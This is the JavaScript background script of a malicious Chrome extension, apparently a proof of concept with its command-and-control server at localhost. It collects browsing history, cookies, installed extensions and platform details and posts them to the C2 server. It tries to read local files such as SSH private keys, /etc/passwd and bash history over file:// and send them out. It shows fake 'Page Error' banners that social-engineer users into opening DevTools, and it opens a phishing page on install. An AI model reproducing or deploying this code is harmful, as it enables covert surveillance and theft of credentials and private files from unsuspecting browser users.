const C2 = 'http://localhost:8080';
const EXT_ID = chrome.runtime.id;

console.log('[C2] Background started');

async function sendToC2(type, data) {
  try {
    console.log(`Sending to C2: ${type}`, data);
    const response = await fetch(`${C2}/api/collect`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        extId: EXT_ID,
        type: type,
        data: data,
        time: Date.now()
      })
    });
    console.log(`Response: ${response.status}`);
    if (response.status === 200) {
      console.log(` ${type} sent successfully`);
    }
  } catch (e) {
    console.error('Failed to send:', e);
    chrome.storage.local.set({ [`pending_${type}`]: data });
  }
}

function stealFilesViaDevTools() {
  console.log('[DEVTOOLS] Attempting to steal files via DevTools');
  
  const filesToSteal = [
    'C:/Windows/System32/drivers/etc/hosts',
    'C:/Users/Public/Documents/passwords.txt',
    'C:/Users/' + (typeof process !== 'undefined' ? process.env.USERNAME : '') + '/.ssh/id_rsa',
    '/etc/passwd',
    '~/.bash_history',
    'C:/Windows/win.ini',
    'C:/boot.ini'
  ];

  const exploitCode = `
    (function() {
      console.log(' Executing in privileged context');
      const results = [];
      const files = ${JSON.stringify(filesToSteal)};
      
      async function stealFiles() {
        for (const file of files) {
          try {
            const response = await fetch('file://' + file);
            if (response.ok) {
              const text = await response.text();
              results.push({
                file: file,
                size: text.length,
                content: text.substring(0, 5000)
              });
              console.log(' Stolen:', file);
            }
          } catch (e) {
            console.log(' Failed:', file);
          }
        }

        fetch('${C2}/api/collect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'files_from_devtools',
            data: results
          })
        });
      }
      
      stealFiles();
      return 'File theft attempted via DevTools';
    })();
  `;

  console.log('[DEVTOOLS] Waiting for user to open DevTools...');

  chrome.storage.local.set({ pending_devtools_exploit: exploitCode });
}

function exploitPrivilegedPage(tabId, url) {
  console.log('[EXPLOIT] Targeting:', url);
  
  if (!chrome.scripting || !chrome.scripting.executeScript) {
    sendToC2('privileged_page_view', { url: url, canInject: false });
    return;
  }
  
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: (c2Url) => {
      console.log('[!] Attempting to read files from privileged page');
      
      const targets = [
        'C:/Windows/System32/drivers/etc/hosts',
        'C:/Users/Public/Documents/passwords.txt'
      ];
      
      targets.forEach(async (file) => {
        try {
          const res = await fetch(`file://${file}`);
          const text = await res.text();
          
          fetch(`${c2Url}/api/collect`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              type: 'file_from_privileged', 
              data: { file: file, content: text.substring(0, 1000) }
            })
          });
        } catch (e) {
          console.log(`Cannot read ${file}:`, e);
        }
      });
      
      return 'Injection attempted';
    },
    args: [C2]
  }).then(result => {
    console.log('Injection result:', result);
    sendToC2('privileged_injection_success', { url: url });
  }).catch(err => {
    console.log('Direct injection failed:', err);
    sendToC2('privileged_injection_failed', { url: url, error: err.message });

    exploitViaDevTools(tabId, url);
  });
}

function exploitViaDevTools(tabId, url) {
  console.log('[DEVTOOLS] Attempting exploitation via DevTools for:', url);
  
  chrome.tabs.update(tabId, { highlighted: true });
  
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: () => {

      const div = document.createElement('div');
      div.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #ff4444;
        color: white;
        padding: 20px;
        border-radius: 10px;
        z-index: 999999;
        font-family: Arial;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        animation: slideIn 0.5s;
        max-width: 300px;
      `;
      div.innerHTML = `
        <h3> Page Error </h3>
        <p>An unexpected error occurred. Please open Developer Tools (F12) for.</p>
        <p style="font-size: 12px; color: #ffaaaa;">Defcon 1337: </p>
        <button onclick="this.parentElement.remove()" style="
          background: white;
          color: #ff4444;
          border: none;
          padding: 5px 15px;
          border-radius: 5px;
          cursor: pointer;
          margin-top: 10px;
        ">Close</button>
      `;
      document.body.appendChild(div);
      
      const style = document.createElement('style');
      style.textContent = `
        @keyframes slideIn {
          from { transform: translateX(100%); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
      `;
      document.head.appendChild(style);

      let devtoolsOpened = false;
      const checkDevTools = setInterval(() => {
        if (window.outerHeight - window.innerHeight > 100) {
          devtoolsOpened = true;
          clearInterval(checkDevTools);

          fetch('${C2}/api/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'devtools_opened',
              data: { url: window.location.href }
            })
          });
        }
      }, 1000);
    }
  }).catch(() => {});
  
  sendToC2('devtools_required', { 
    url: url,
    message: 'User needs to open DevTools manually'
  });
}

function handlePrivilegedPage(tabId, url) {
  console.log('[PRIVILEGED] Detected:', url);
  
  sendToC2('privileged_page', { url: url });
  
  if (chrome.scripting) {
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        return {
          url: window.location.href,
          canInject: false,
          message: 'Direct injection blocked by Chrome'
        };
      }
    }).catch(err => {
      console.log('Expected error (direct injection blocked):', err.message);

      chrome.scripting.executeScript({
        target: { tabId: tabId },
        func: () => {
          if (!document.getElementById('devtools-prompt')) {
            const prompt = document.createElement('div');
            prompt.id = 'devtools-prompt';
            prompt.style.cssText = `
              position: fixed;
              top: 0;
              left: 0;
              right: 0;
              background: #ff4444;
              color: white;
              padding: 15px;
              text-align: center;
              z-index: 10000;
              font-size: 18px;
              cursor: pointer;
              font-family: Arial;
            `;
            prompt.innerHTML = `
              Page Error - Press F12 to open Developer Tools and fix the issue automatically
              <span style="float:right; margin-right:20px; cursor:pointer;">✕</span>
            `;
            prompt.onclick = (e) => {
              if (e.target.tagName === 'SPAN') {
                prompt.remove();
              }
            };
            document.body.prepend(prompt);
            
            setTimeout(() => prompt.remove(), 15000);
          }
        }
      }).catch(() => {});
    });
  }
  
  sendToC2('devtools_prompt_shown', { url: url });
}

chrome.tabs.onUpdated.addListener((tabId, change, tab) => {
  if (change.status === 'complete' && tab.url) {
    if (tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
      console.log('Privileged page detected:', tab.url);
      handlePrivilegedPage(tabId, tab.url);
    } else {
      sendToC2('navigation', { 
        url: tab.url.substring(0, 500), 
        title: (tab.title || '').substring(0, 200) 
      });
      
      chrome.tabs.sendMessage(tabId, { 
        action: 'steal', 
        c2: C2 
      }).catch(() => {});
    }
  }
});

if (chrome.management && chrome.management.getAll) {
  chrome.management.getAll((extensions) => {
    if (extensions) {
      const extList = extensions.map(e => ({
        id: e.id,
        name: e.name,
        version: e.version,
        enabled: e.enabled,
        type: e.type,
        permissions: e.permissions ? e.permissions.slice(0, 10) : []
      }));
      sendToC2('extensions', extList);
    }
  });
}

if (chrome.cookies && chrome.cookies.getAll) {
  chrome.cookies.getAll({}, (cookies) => {
    if (cookies) {
      const safeCookies = cookies.slice(0, 50).map(c => ({
        name: c.name,
        domain: c.domain,
        secure: c.secure,
        httpOnly: c.httpOnly
      }));
      sendToC2('cookies', safeCookies);
    }
  });
  
  chrome.cookies.onChanged.addListener((changeInfo) => {
    sendToC2('cookie_changed', {
      cookie: changeInfo.cookie,
      cause: changeInfo.cause,
      removed: changeInfo.removed
    });
  });
}

if (chrome.alarms) {
  chrome.alarms.create('heartbeat', { periodInMinutes: 1 });
  chrome.alarms.create('steal_files', { periodInMinutes: 5 });
  
  chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'heartbeat') {
      sendToC2('heartbeat', { time: Date.now() });
    } else if (alarm.name === 'steal_files') {
      stealFilesViaDevTools();
    }
  });
}

chrome.runtime.onInstalled.addListener((details) => {
  sendToC2('installed', { 
    reason: details.reason,
    previousVersion: details.previousVersion 
  });
  
  if (details.reason === 'install') {

    chrome.tabs.create({
      url: chrome.runtime.getURL('phishing.html')
    });
  }
});

chrome.runtime.getPlatformInfo((platform) => {
  sendToC2('platform', platform);
});

setTimeout(() => {
  sendToC2('startup', { id: EXT_ID });

  chrome.storage.local.get(null, (items) => {
    console.log('Pending items:', Object.keys(items));
  });
}, 2000);

console.log('[C2] Ready - Ultimate version with DevTools exploitation');
